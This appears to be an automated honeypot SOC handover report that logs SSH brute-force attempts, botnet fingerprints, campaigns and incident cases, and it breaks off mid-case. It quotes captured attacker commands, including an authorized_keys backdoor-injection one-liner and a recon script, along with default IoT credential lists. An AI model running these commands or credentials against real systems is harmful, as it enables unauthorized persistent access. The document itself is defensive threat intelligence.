# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-16 |
| **Generated At** | 2026-08-16T14:27:27Z |
| **Shift Time** | 14:27 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **4552** |
| Confirmed Threats | **4530** |
| False Positives Filtered | **22** (0.5%) |
| Unique Attacker IPs | **53** |
| Countries of Origin | **26** |
| High Severity Cases | **145** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **4407** |
| Malware Samples Analyzed | **2** HIGH · **23** MED · 20 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **167** |
| Unique Credential Pairs | **130** |
| Unique Usernames | **34** |
| Unique Passwords | **85** |
| Successful Auth Pairs | **154** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 48 |
| `admin` | 19 |
| `git` | 14 |
| `blank` | 14 |
| `guest` | 11 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `1234` | 11 |
| `password` | 7 |
| `123456` | 6 |
| `112233` | 6 |
| `dietpi` | 6 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `blank` | `112233` | 6 |
| `debian` | `dietpi` | 6 |
| `root` | `` | 4 |
| `support` | `support` | 4 |
| `blank` | `1234` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `ec2-user` | `password` | `195.178.110.232` | 2026-08-16T10:56:01 |
| `ftp` | `123` | `195.178.110.232` | 2026-08-16T10:57:29 |
| `ftp` | `123456` | `195.178.110.232` | 2026-08-16T10:58:56 |
| `git` | `123` | `195.178.110.232` | 2026-08-16T11:00:23 |
| `root` | `Qwe123123` | `45.142.193.164` | 2026-08-16T11:01:14 |
| `root` | `` | `94.154.43.89` | 2026-08-16T11:01:48 |
| `git` | `123123` | `195.178.110.232` | 2026-08-16T11:01:51 |
| `user` | `Password1` | `10.0.0.73` | 2026-08-16T11:02:13 |
| `git` | `1234` | `195.178.110.232` | 2026-08-16T11:03:19 |
| `git` | `12345` | `195.178.110.232` | 2026-08-16T11:04:48 |
| `git` | `123456` | `195.178.110.232` | 2026-08-16T11:06:16 |
| `git` | `12345678` | `195.178.110.232` | 2026-08-16T11:07:42 |
| `git` | `123456789` | `195.178.110.232` | 2026-08-16T11:09:07 |
| `deployer` | `deployer` | `217.165.22.192` | 2026-08-16T11:10:10 |
| `git` | `code` | `195.178.110.232` | 2026-08-16T11:10:33 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-08-16T11:11:28 |
| `root` | `123@@@` | `64.110.90.250` | 2026-08-16T11:11:28 |
| `git` | `git` | `195.178.110.232` | 2026-08-16T11:11:59 |
| `ubnt` | `123123` | `50.217.255.171` | 2026-08-16T11:13:06 |
| `git` | `github` | `195.178.110.232` | 2026-08-16T11:13:26 |
| `admin` | `Abcd@1234` | `10.0.0.73` | 2026-08-16T11:14:18 |
| `git` | `gitlab` | `195.178.110.232` | 2026-08-16T11:14:54 |
| `ubuntu` | `P@ssw0rd` | `185.74.59.14` | 2026-08-16T11:15:24 |
| `git` | `passw0rd` | `195.178.110.232` | 2026-08-16T11:16:24 |
| `git` | `password` | `195.178.110.232` | 2026-08-16T11:17:51 |
| `blank` | `112233` | `49.124.151.2` | 2026-08-16T11:17:59 |
| `blank` | `112233` | `222.92.61.242` | 2026-08-16T11:18:09 |
| `git` | `qwerty` | `195.178.110.232` | 2026-08-16T11:19:19 |
| `root` | `` | `92.5.22.41` | 2026-08-16T11:19:51 |
| `admin` | `admin` | `92.5.22.41` | 2026-08-16T11:19:52 |
| `telnet` | `telnet` | `92.5.22.41` | 2026-08-16T11:19:53 |
| `support` | `support` | `92.5.22.41` | 2026-08-16T11:19:54 |
| `user` | `user` | `92.5.22.41` | 2026-08-16T11:19:55 |
| `admin` | `` | `92.5.22.41` | 2026-08-16T11:19:57 |
| `admin` | `password` | `92.5.22.41` | 2026-08-16T11:19:58 |
| `root` | `vizxv` | `92.5.22.41` | 2026-08-16T11:19:59 |
| `root` | `admin` | `92.5.22.41` | 2026-08-16T11:20:00 |
| `root` | `xc3511` | `92.5.22.41` | 2026-08-16T11:20:01 |
| `root` | `888888` | `92.5.22.41` | 2026-08-16T11:20:02 |
| `root` | `xmhdipc` | `92.5.22.41` | 2026-08-16T11:20:03 |
| `root` | `default` | `92.5.22.41` | 2026-08-16T11:20:05 |
| `root` | `juantech` | `92.5.22.41` | 2026-08-16T11:20:06 |
| `root` | `54321` | `92.5.22.41` | 2026-08-16T11:20:08 |
| `root` | `12345` | `92.5.22.41` | 2026-08-16T11:20:09 |
| `root` | `pass` | `92.5.22.41` | 2026-08-16T11:20:10 |
| `ubnt` | `ubnt` | `92.5.22.41` | 2026-08-16T11:20:11 |
| `root` | `klv1234` | `92.5.22.41` | 2026-08-16T11:20:12 |
| `root` | `Zte521` | `92.5.22.41` | 2026-08-16T11:20:14 |
| `root` | `hi3518` | `92.5.22.41` | 2026-08-16T11:20:15 |
| `root` | `jvbzd` | `92.5.22.41` | 2026-08-16T11:20:16 |
| `root` | `anko` | `92.5.22.41` | 2026-08-16T11:20:17 |
| `root` | `zlxx.` | `92.5.22.41` | 2026-08-16T11:20:18 |
| `root` | `7ujMko0vizxv` | `92.5.22.41` | 2026-08-16T11:20:19 |
| `root` | `7ujMko0admin` | `92.5.22.41` | 2026-08-16T11:20:20 |
| `root` | `system` | `92.5.22.41` | 2026-08-16T11:20:21 |
| `root` | `ikwb` | `92.5.22.41` | 2026-08-16T11:20:23 |
| `root` | `dreambox` | `92.5.22.41` | 2026-08-16T11:20:24 |
| `root` | `user` | `92.5.22.41` | 2026-08-16T11:20:25 |
| `root` | `realtek` | `92.5.22.41` | 2026-08-16T11:20:26 |
| `root` | `00000000` | `92.5.22.41` | 2026-08-16T11:20:27 |
| `admin` | `1111111` | `92.5.22.41` | 2026-08-16T11:20:28 |
| `admin` | `1234` | `92.5.22.41` | 2026-08-16T11:20:30 |
| `admin` | `12345` | `92.5.22.41` | 2026-08-16T11:20:31 |
| `admin` | `54321` | `92.5.22.41` | 2026-08-16T11:20:32 |
| `admin` | `123456` | `92.5.22.41` | 2026-08-16T11:20:33 |
| `admin` | `7ujMko0admin` | `92.5.22.41` | 2026-08-16T11:20:34 |
| `admin` | `pass` | `92.5.22.41` | 2026-08-16T11:20:35 |
| `admin` | `meinsm` | `92.5.22.41` | 2026-08-16T11:20:36 |
| `admin` | `admin1234` | `92.5.22.41` | 2026-08-16T11:20:38 |
| `root` | `1111` | `92.5.22.41` | 2026-08-16T11:20:39 |
| `admin` | `smcadmin` | `92.5.22.41` | 2026-08-16T11:20:40 |
| `admin` | `1111` | `92.5.22.41` | 2026-08-16T11:20:41 |
| `root` | `666666` | `92.5.22.41` | 2026-08-16T11:20:42 |
| `root` | `password` | `92.5.22.41` | 2026-08-16T11:20:43 |
| `root` | `1234` | `92.5.22.41` | 2026-08-16T11:20:45 |
| `user` | `Password1` | `62.182.132.94` | 2026-08-16T11:20:45 |
| `guest` | `1` | `195.178.110.232` | 2026-08-16T11:20:45 |
| `root` | `klv123` | `92.5.22.41` | 2026-08-16T11:20:46 |
| `Administrator` | `admin` | `92.5.22.41` | 2026-08-16T11:20:47 |
| `service` | `service` | `92.5.22.41` | 2026-08-16T11:20:48 |
| `supervisor` | `supervisor` | `92.5.22.41` | 2026-08-16T11:20:50 |
| `guest` | `guest` | `92.5.22.41` | 2026-08-16T11:20:51 |
| `guest` | `12345` | `92.5.22.41` | 2026-08-16T11:20:52 |
| `admin1` | `password` | `92.5.22.41` | 2026-08-16T11:20:53 |
| `administrator` | `1234` | `92.5.22.41` | 2026-08-16T11:20:54 |
| `666666` | `666666` | `92.5.22.41` | 2026-08-16T11:20:55 |
| `888888` | `888888` | `92.5.22.41` | 2026-08-16T11:20:57 |
| `tech` | `tech` | `92.5.22.41` | 2026-08-16T11:20:58 |
| `mother` | `fucker` | `92.5.22.41` | 2026-08-16T11:20:59 |
| `guest` | `123` | `195.178.110.232` | 2026-08-16T11:22:12 |
| `guest` | `1234` | `195.178.110.232` | 2026-08-16T11:23:39 |
| `root` | `Zxc@123123` | `45.142.193.164` | 2026-08-16T11:24:01 |
| `guest` | `12345` | `195.178.110.232` | 2026-08-16T11:25:07 |
| `guest` | `123456` | `195.178.110.232` | 2026-08-16T11:26:33 |
| `guest` | `123456789` | `195.178.110.232` | 2026-08-16T11:28:01 |
| `support` | `support` | `176.53.159.196` | 2026-08-16T11:28:45 |
| `user` | `12345678` | `217.165.22.192` | 2026-08-16T11:29:17 |
| `blank` | `112233` | `10.0.0.73` | 2026-08-16T11:29:23 |
| `guest` | `1234567890` | `195.178.110.232` | 2026-08-16T11:29:27 |
| `guest` | `password` | `195.178.110.232` | 2026-08-16T11:30:56 |
| `admin` | `Abcd@1234` | `222.174.184.86` | 2026-08-16T11:31:54 |
| `admin` | `Abcd@1234` | `218.21.241.50` | 2026-08-16T11:32:04 |
| `guest` | `qwerty` | `195.178.110.232` | 2026-08-16T11:32:26 |
| `root` | `LeitboGi0ro` | `165.1.75.106` | 2026-08-16T11:33:05 |
| `root` | `123@@@` | `165.1.75.106` | 2026-08-16T11:33:10 |
| `manager` | `1234` | `195.178.110.232` | 2026-08-16T11:33:57 |
| `manager` | `12345678` | `195.178.110.232` | 2026-08-16T11:35:27 |
| `root` | `ubuntu` | `101.96.212.81` | 2026-08-16T11:35:49 |
| `debian` | `dietpi` | `10.0.0.73` | 2026-08-16T11:36:16 |
| `mysql` | `123` | `195.178.110.232` | 2026-08-16T11:36:59 |
| `mysql` | `123123` | `195.178.110.232` | 2026-08-16T11:38:34 |
| `ubuntu` | `Aa123456789` | `185.74.59.14` | 2026-08-16T11:39:26 |
| `mysql` | `1234` | `195.178.110.232` | 2026-08-16T11:40:10 |
| `mysql` | `123456` | `195.178.110.232` | 2026-08-16T11:41:47 |
| `mysql` | `12345678` | `195.178.110.232` | 2026-08-16T11:43:24 |
| `mysql` | `mysql` | `195.178.110.232` | 2026-08-16T11:45:02 |
| `blank` | `112233` | `111.46.77.2` | 2026-08-16T11:46:23 |
| `blank` | `112233` | `63.135.169.175` | 2026-08-16T11:46:31 |
| `mysql` | `password` | `195.178.110.232` | 2026-08-16T11:46:38 |
| `root` | `123qwer!@#$` | `45.142.193.164` | 2026-08-16T11:46:55 |
| `test` | `admin123#` | `10.0.0.73` | 2026-08-16T11:48:05 |
| `mysql` | `root` | `195.178.110.232` | 2026-08-16T11:48:15 |
| `log` | `log` | `217.165.22.192` | 2026-08-16T11:48:24 |
| `ubuntu` | `test123` | `68.183.244.58` | 2026-08-16T11:49:11 |
| `345gs5662d34` | `345gs5662d34` | `68.183.244.58` | 2026-08-16T11:49:16 |
| `ubuntu` | `3245gs5662d34` | `68.183.244.58` | 2026-08-16T11:49:18 |
| `nginx` | `123` | `195.178.110.232` | 2026-08-16T11:49:56 |
| `ubuntu` | `Aa123456.` | `103.60.242.169` | 2026-08-16T11:50:31 |
| `345gs5662d34` | `345gs5662d34` | `103.60.242.169` | 2026-08-16T11:50:35 |
| `ubuntu` | `3245gs5662d34` | `103.60.242.169` | 2026-08-16T11:50:37 |
| `support` | `support` | `10.0.0.73` | 2026-08-16T11:53:40 |
| `debian` | `dietpi` | `182.42.113.10` | 2026-08-16T11:54:26 |
| `debian` | `dietpi` | `220.246.66.209` | 2026-08-16T11:54:36 |
| `debian` | `dietpi` | `220.132.170.64` | 2026-08-16T11:54:39 |
| `debian` | `dietpi` | `103.174.145.35` | 2026-08-16T11:54:48 |
| `test` | `admin123#` | `185.246.255.183` | 2026-08-16T12:05:45 |
| `tomcat` | `tomcat` | `217.165.22.192` | 2026-08-16T12:07:31 |
| `root` | `12qw12qw` | `45.142.193.164` | 2026-08-16T12:09:52 |
| `root` | `﻿------fuck------` | `10.0.0.73` | 2026-08-16T12:19:25 |
| `root` | `cisco123` | `210.4.68.72` | 2026-08-16T12:20:15 |
| `blank` | `1234` | `10.0.0.73` | 2026-08-16T12:21:57 |
| `blank` | `1234` | `183.233.85.194` | 2026-08-16T12:23:40 |
| `blank` | `1234` | `103.174.145.35` | 2026-08-16T12:23:49 |
| `blank` | `00` | `34.146.248.7` | 2026-08-16T12:25:25 |
| `admin` | `admin` | `10.0.0.73` | 2026-08-16T12:25:40 |
| `user1` | `user1` | `217.165.22.192` | 2026-08-16T12:26:38 |
| `test` | `qwerty` | `103.174.145.35` | 2026-08-16T12:28:23 |
| `root` | `1234abcd!` | `45.142.193.164` | 2026-08-16T12:32:44 |
| `blank` | `00` | `10.0.0.73` | 2026-08-16T12:36:52 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236` | `194.195.210.47` | 2026-08-16T12:38:13 |
| `config` | `passw0rd` | `10.0.0.73` | 2026-08-16T12:43:47 |
| `secret` | `secret488121!` | `217.165.22.192` | 2026-08-16T12:45:45 |
| `blank` | `00` | `93.4.16.74` | 2026-08-16T12:54:06 |
| `blank` | `00` | `186.215.107.189` | 2026-08-16T12:54:15 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **4552** |
| Sessions with Fingerprint | **9** |
| Unique HASSH Fingerprints | **9** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 55 |
| OpenSSH | 20 |
| libssh | 15 |
| Paramiko (Python) | 4 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `2ec37a7cc8da...` | Mirai/variant | 37 | 1 |
| `acaa53e0a7d7...` | Mirai/variant | 20 | 18 |
| `98ddc5604ef6...` | Modern SSH client | 8 | 3 |
| `e45f2d6d7f79...` | Mirai/variant | 6 | 1 |
| `f555226df196...` | Mirai/variant | 6 | 2 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `2ec37a7cc8da...` | Go SSH scanner | 37 | 1 | Mirai/variant |
| `acaa53e0a7d7...` | OpenSSH | 20 | 18 | Mirai/variant |
| `95420f9d932d...` | libssh | 9 | 5 | — |
| `98ddc5604ef6...` | Go SSH scanner | 8 | 3 | Modern SSH client |
| `e45f2d6d7f79...` | Go SSH scanner | 6 | 1 | Mirai/variant |
| `f555226df196...` | libssh | 6 | 2 | Mirai/variant |
| `a2de0f306611...` | Paramiko (Python) | 4 | 2 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 3 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **7** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 37 | 1 | `T1082, T1592, T1078, T1083` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1082, T1105, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 2 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `195.178.110.232`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
echo SHELL_TEST
```
```
/bin/busybox TEST
```
```
cat /proc
```
```
./
```
Source IPs: `94.154.43.89`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `103.60.242.169`, `68.183.244.58`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **53** |
| Unique ASNs | **40** |
| High-Risk ASNs | **35** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS63949` | Akamai Connected Cloud | 4 | HIGH |
| `AS31898` | Oracle Corporation | 3 | HIGH |
| `AS4134` | CHINANET BACKBONE | 3 | HIGH |
| `AS3301` | Telia Company AB | 3 | HIGH |
| `AS4818` | DiGi Telecommunications Sdn. Bhd. | 2 | HIGH |
| `AS9808` | China Mobile Communications Group Co., Ltd. | 2 | HIGH |
| `AS20115` | Charter Communications LLC | 2 | HIGH |
| `AS14061` | DigitalOcean, LLC | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (145)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-9e3d7ec9c657

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-16 10:55 |
| **Last Seen** | 2026-08-16 10:56 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 10:55:58` | `cowrie.session.connect` |
| `2026-08-16 10:55:59` | `cowrie.client.version` |
| `2026-08-16 10:55:59` | `cowrie.client.kex` |
| `2026-08-16 10:56:01` | `cowrie.login.success` |
| `2026-08-16 10:56:02` | `cowrie.session.params` |
| `2026-08-16 10:56:02` | `cowrie.command.input` |
| `2026-08-16 10:56:02` | `cowrie.command.input` |
| `2026-08-16 10:56:02` | `cowrie.command.input` |
| `2026-08-16 10:56:02` | `cowrie.command.input` |
| `2026-08-16 10:56:02` | `cowrie.command.input` |
| `2026-08-16 10:56:02` | `cowrie.command.success` |
| `2026-08-16 10:56:02` | `cowrie.command.input` |
| `2026-08-16 10:56:02` | `cowrie.command.input` |
| `2026-08-16 10:56:02` | `cowrie.command.input` |
| `2026-08-16 10:56:02` | `cowrie.command.input` |
| `2026-08-16 10:56:03` | `cowrie.log.closed` |
| `2026-08-16 10:56:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f14865308c6

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-16 10:57 |
| **Last Seen** | 2026-08-16 10:57 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 10:57:26` | `cowrie.session.connect` |
| `2026-08-16 10:57:27` | `cowrie.client.version` |
| `2026-08-16 10:57:27` | `cowrie.client.kex` |
| `2026-08-16 10:57:29` | `cowrie.login.success` |
| `2026-08-16 10:57:31` | `cowrie.session.params` |
| `2026-08-16 10:57:31` | `cowrie.command.input` |
| `2026-08-16 10:57:31` | `cowrie.command.input` |
| `2026-08-16 10:57:31` | `cowrie.command.input` |
| `2026-08-16 10:57:31` | `cowrie.command.input` |
| `2026-08-16 10:57:31` | `cowrie.command.input` |
| `2026-08-16 10:57:31` | `cowrie.command.success` |
| `2026-08-16 10:57:31` | `cowrie.command.input` |
| `2026-08-16 10:57:31` | `cowrie.command.input` |
| `2026-08-16 10:57:31` | `cowrie.command.input` |
| `2026-08-16 10:57:31` | `cowrie.command.input` |
| `2026-08-16 10:57:31` | `cowrie.log.closed` |
| `2026-08-16 10:57:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7499024564f7

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-16 10:58 |
| **Last Seen** | 2026-08-16 10:59 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 10:58:53` | `cowrie.session.connect` |
| `2026-08-16 10:58:54` | `cowrie.client.version` |
| `2026-08-16 10:58:54` | `cowrie.client.kex` |
| `2026-08-16 10:58:56` | `cowrie.login.success` |
| `2026-08-16 10:58:58` | `cowrie.session.params` |
| `2026-08-16 10:58:58` | `cowrie.command.input` |
| `2026-08-16 10:58:58` | `cowrie.command.input` |
| `2026-08-16 10:58:58` | `cowrie.command.input` |
| `2026-08-16 10:58:58` | `cowrie.command.input` |
| `2026-08-16 10:58:58` | `cowrie.command.input` |
| `2026-08-16 10:58:58` | `cowrie.command.success` |
| `2026-08-16 10:58:58` | `cowrie.command.input` |
| `2026-08-16 10:58:58` | `cowrie.command.input` |
| `2026-08-16 10:58:58` | `cowrie.command.input` |
| `2026-08-16 10:58:58` | `cowrie.command.input` |
| `2026-08-16 10:58:59` | `cowrie.log.closed` |
| `2026-08-16 10:59:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58ec284ec139

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-16 11:00 |
| **Last Seen** | 2026-08-16 11:00 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:00:21` | `cowrie.session.connect` |
| `2026-08-16 11:00:21` | `cowrie.client.version` |
| `2026-08-16 11:00:21` | `cowrie.client.kex` |
| `2026-08-16 11:00:23` | `cowrie.login.success` |
| `2026-08-16 11:00:27` | `cowrie.session.params` |
| `2026-08-16 11:00:27` | `cowrie.command.input` |
| `2026-08-16 11:00:27` | `cowrie.command.input` |
| `2026-08-16 11:00:27` | `cowrie.command.input` |
| `2026-08-16 11:00:27` | `cowrie.command.input` |
| `2026-08-16 11:00:27` | `cowrie.command.input` |
| `2026-08-16 11:00:27` | `cowrie.command.success` |
| `2026-08-16 11:00:27` | `cowrie.command.input` |
| `2026-08-16 11:00:27` | `cowrie.command.input` |
| `2026-08-16 11:00:27` | `cowrie.command.input` |
| `2026-08-16 11:00:27` | `cowrie.command.input` |
| `2026-08-16 11:00:28` | `cowrie.log.closed` |
| `2026-08-16 11:00:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c645355a4046

| Field | Detail |
|---|---|
| **Source IP** | `45.142.193[.]164` |
| **First Seen** | 2026-08-16 11:00 |
| **Last Seen** | 2026-08-16 11:01 |
| **Session Duration** | 46s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:00:46` | `cowrie.session.connect` |
| `2026-08-16 11:00:51` | `cowrie.client.version` |
| `2026-08-16 11:00:51` | `cowrie.client.kex` |
| `2026-08-16 11:01:14` | `cowrie.login.success` |
| `2026-08-16 11:01:26` | `cowrie.session.params` |
| `2026-08-16 11:01:26` | `cowrie.command.input` |
| `2026-08-16 11:01:32` | `cowrie.log.closed` |
| `2026-08-16 11:01:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.142.193[.]164` to AbuseIPDB if not already reported
- [ ] Block `45.142.193[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e65fc72c314e

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]89` |
| **First Seen** | 2026-08-16 11:01 |
| **Last Seen** | 2026-08-16 11:01 |
| **Session Duration** | 3s |
